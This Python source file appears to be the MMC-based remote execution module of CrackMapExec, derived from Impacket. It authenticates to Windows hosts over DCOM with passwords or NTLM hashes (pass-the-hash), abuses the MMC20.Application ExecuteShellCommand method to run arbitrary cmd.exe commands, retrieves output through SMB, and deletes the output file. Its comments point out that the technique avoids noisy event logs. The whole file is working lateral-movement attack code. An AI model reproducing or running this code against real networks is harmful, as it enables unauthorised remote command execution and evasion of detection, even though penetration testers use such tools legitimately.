#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright (c) 2003-2016 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# A similar approach to wmiexec but executing commands through MMC.
# Main advantage here is it runs under the user (has to be Admin)
# account, not SYSTEM, plus, it doesn't generate noisy messages
# in the event log that smbexec.py does when creating a service.
# Drawback is it needs DCOM, hence, I have to be able to access
# DCOM ports at the target machine.
#
# Original discovery by Matt Nelson (@enigma0x3):
# https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
#
# Author:
#  beto (@agsolino)
#
# Reference for:
#  DCOM
#
# ToDo:
# [ ] Kerberos auth not working, invalid_checksum is thrown. Most probably sequence numbers out of sync due to
#     getInterface() method
#

from os.path import join as path_join
from time import sleep
from cme.connection import dcom_FirewallChecker
from cme.helpers.misc import gen_random_string

from impacket.dcerpc.v5.dcom.oaut import (
    IID_IDispatch,
    string_to_bin,
    IDispatch,
    DISPPARAMS,
    DISPATCH_PROPERTYGET,
    VARIANT,
    VARENUM,
    DISPATCH_METHOD,
)
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcomrt import (
    OBJREF,
    FLAGS_OBJREF_CUSTOM,
    OBJREF_CUSTOM,
    OBJREF_HANDLER,
    OBJREF_EXTENDED,
    OBJREF_STANDARD,
    FLAGS_OBJREF_HANDLER,
    FLAGS_OBJREF_STANDARD,
    FLAGS_OBJREF_EXTENDED,
    IRemUnknown2,
    INTERFACE,
)
from impacket.dcerpc.v5.dtypes import NULL


class MMCEXEC:
    def __init__(self, host, share_name, username, password, domain, smbconnection, share, hashes=None, logger=None, tries=None, timeout=None):
        self.__host = host
        self.__username = username
        self.__password = password
        self.__smbconnection = smbconnection
        self.__domain = domain
        self.__lmhash = ""
        self.__nthash = ""
        self.__share_name = share_name
        self.__output = None
        self.__outputBuffer = b""
        self.__shell = "c:\\windows\\system32\\cmd.exe"
        self.__pwd = "C:\\"
        self.__quit = None
        self.__executeShellCommand = None
        self.__retOutput = True
        self.__share = share
        self.__dcom = None
        self.__tries = tries
        self.__timeout = timeout
        self.logger = logger

        if hashes is not None:
            if hashes.find(":") != -1:
                self.__lmhash, self.__nthash = hashes.split(":")
            else:
                self.__nthash = hashes

        self.__dcom = DCOMConnection(
            self.__host,
            self.__username,
            self.__password,
            self.__domain,
            self.__lmhash,
            self.__nthash,
            None,
            oxidResolver=True,
        )
        try:
            iInterface = self.__dcom.CoCreateInstanceEx(string_to_bin("49B2791A-B1AE-4C90-9B8E-E860BA07F889"), IID_IDispatch)
        except:
            # Make it force break function
            self.__dcom.disconnect()
        flag, self.__stringBinding =  dcom_FirewallChecker(iInterface, self.__timeout)
        if not flag or not self.__stringBinding:
            error_msg = f'MMCEXEC: Dcom initialization failed on connection with stringbinding: "{self.__stringBinding}", please increase the timeout with the option "--dcom-timeout". If it\'s still failing maybe something is blocking the RPC connection, try another exec method'
            
            if not self.__stringBinding:
                error_msg = "MMCEXEC: Dcom initialization failed: can't get target stringbinding, maybe cause by IPv6 or any other issues, please check your target again"
            
            self.logger.fail(error_msg) if not flag else self.logger.debug(error_msg)
            # Make it force break function
            self.__dcom.disconnect()
        iMMC = IDispatch(iInterface)

        resp = iMMC.GetIDsOfNames(("Document",))

        dispParams = DISPPARAMS(None, False)
        dispParams["rgvarg"] = NULL
        dispParams["rgdispidNamedArgs"] = NULL
        dispParams["cArgs"] = 0
        dispParams["cNamedArgs"] = 0
        resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])

        iDocument = IDispatch(self.getInterface(iMMC, resp["pVarResult"]["_varUnion"]["pdispVal"]["abData"]))
        resp = iDocument.GetIDsOfNames(("ActiveView",))
        resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])

        iActiveView = IDispatch(self.getInterface(iMMC, resp["pVarResult"]["_varUnion"]["pdispVal"]["abData"]))
        pExecuteShellCommand = iActiveView.GetIDsOfNames(("ExecuteShellCommand",))[0]

        pQuit = iMMC.GetIDsOfNames(("Quit",))[0]

        self.__quit = (iMMC, pQuit)
        self.__executeShellCommand = (iActiveView, pExecuteShellCommand)

    def getInterface(self, interface, resp):
        # Now let's parse the answer and build an Interface instance
        objRefType = OBJREF(b"".join(resp))["flags"]
        objRef = None
        if objRefType == FLAGS_OBJREF_CUSTOM:
            objRef = OBJREF_CUSTOM(b"".join(resp))
        elif objRefType == FLAGS_OBJREF_HANDLER:
            objRef = OBJREF_HANDLER(b"".join(resp))
        elif objRefType == FLAGS_OBJREF_STANDARD:
            objRef = OBJREF_STANDARD(b"".join(resp))
        elif objRefType == FLAGS_OBJREF_EXTENDED:
            objRef = OBJREF_EXTENDED(b"".join(resp))
        else:
            self.logger.fail("Unknown OBJREF Type! 0x%x" % objRefType)

        return IRemUnknown2(
            INTERFACE(
                interface.get_cinstance(),
                None,
                interface.get_ipidRemUnknown(),
                objRef["std"]["ipid"],
                oxid=objRef["std"]["oxid"],
                oid=objRef["std"]["oxid"],
                target=interface.get_target(),
            )
        )

    def execute(self, command, output=False):
        self.__retOutput = output
        self.execute_remote(command)
        self.exit()
        self.__dcom.disconnect()
        return self.__outputBuffer

    def exit(self):
        try:
            dispParams = DISPPARAMS(None, False)
            dispParams["rgvarg"] = NULL
            dispParams["rgdispidNamedArgs"] = NULL
            dispParams["cArgs"] = 0
            dispParams["cNamedArgs"] = 0

            self.__quit[0].Invoke(self.__quit[1], 0x409, DISPATCH_METHOD, dispParams, 0, [], [])
        except Exception as e:
            self.logger.fail(f"Unexpect dcom error when doing exit() function in mmcexec: {str(e)}")
        return True

    def execute_remote(self, data):
        self.__output = "\\Windows\\Temp\\" + gen_random_string(6)

        command = self.__shell + " /Q /c " + data
        if self.__retOutput is True:
            command += " 1> " + f"{self.__output}" + " 2>&1"

        dispParams = DISPPARAMS(None, False)
        dispParams["rgdispidNamedArgs"] = NULL
        dispParams["cArgs"] = 4
        dispParams["cNamedArgs"] = 0
        arg0 = VARIANT(None, False)
        arg0["clSize"] = 5
        arg0["vt"] = VARENUM.VT_BSTR
        arg0["_varUnion"]["tag"] = VARENUM.VT_BSTR
        arg0["_varUnion"]["bstrVal"]["asData"] = self.__shell

        arg1 = VARIANT(None, False)
        arg1["clSize"] = 5
        arg1["vt"] = VARENUM.VT_BSTR
        arg1["_varUnion"]["tag"] = VARENUM.VT_BSTR
        arg1["_varUnion"]["bstrVal"]["asData"] = self.__pwd

        arg2 = VARIANT(None, False)
        arg2["clSize"] = 5
        arg2["vt"] = VARENUM.VT_BSTR
        arg2["_varUnion"]["tag"] = VARENUM.VT_BSTR
        arg2["_varUnion"]["bstrVal"]["asData"] = command

        arg3 = VARIANT(None, False)
        arg3["clSize"] = 5
        arg3["vt"] = VARENUM.VT_BSTR
        arg3["_varUnion"]["tag"] = VARENUM.VT_BSTR
        arg3["_varUnion"]["bstrVal"]["asData"] = "7"
        dispParams["rgvarg"].append(arg3)
        dispParams["rgvarg"].append(arg2)
        dispParams["rgvarg"].append(arg1)
        dispParams["rgvarg"].append(arg0)

        self.__executeShellCommand[0].Invoke(self.__executeShellCommand[1], 0x409, DISPATCH_METHOD, dispParams, 0, [], [])
        self.get_output_remote()

    def output_callback(self, data):
        self.__outputBuffer += data

    def get_output_fileless(self):
        if not self.__retOutput:
            return

        while True:
            try:
                with open(path_join("/tmp", "cme_hosted", self.__output), "r") as output:
                    self.output_callback(output.read())
                break
            except IOError:
                sleep(2)

    def get_output_remote(self):
        if self.__retOutput is False:
            self.__outputBuffer = ""
            return
        tries = 1
        while True:
            try:
                self.logger.info(f"Attempting to read {self.__share}\\{self.__output}")
                self.__smbconnection.getFile(self.__share, self.__output, self.output_callback)
                break
            except Exception as e:
                if tries >= self.__tries:
                    self.logger.fail(f'MMCEXEC: Get output file error, maybe got detected by AV software, please increase the number of tries with the option "--get-output-tries". If it\'s still failing maybe something is blocking the schedule job, try another exec method')
                    break
                if str(e).find("STATUS_BAD_NETWORK_NAME") >0 :
                    self.logger.fail(f'MMCEXEC: Get ouput failed, target has blocked {self.__share} access (maybe command executed!)')
                    break
                if str(e).find("STATUS_SHARING_VIOLATION") >= 0 or str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") >= 0:
                    # Output not finished, let's wait
                    sleep(2)
                    tries += 1
                else:
                    self.logger.debug(str(e))
        
        if self.__outputBuffer:
            self.logger.debug(f"Deleting file {self.__share}\\{self.__output}")
            self.__smbconnection.deleteFile(self.__share, self.__output)